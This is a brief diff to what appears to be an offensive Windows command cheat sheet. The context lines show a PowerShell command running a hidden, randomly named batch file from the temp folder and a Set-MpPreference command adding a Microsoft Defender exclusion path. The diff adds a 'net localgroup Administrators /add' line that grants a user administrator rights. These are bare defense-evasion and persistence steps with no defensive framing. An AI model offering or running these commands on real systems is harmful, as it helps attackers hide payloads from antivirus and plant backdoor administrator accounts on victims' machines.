@@ -129,4 +129,5 @@ powershell -c "Start-Process -FilePath "%temp%\nihbtdtdow.bat" -WindowStyle Hidd
 ---------------------------------------------------------------------------------------------------------------
 powershell Set-MpPreference -ExclusionPath <path> with administrator privs
 ---------------------------------------------------------------------------------------------------------------
-
+net localgroup Administrators /add username with administrator privs
+---------------------------------------------------------------------------------------------------------------
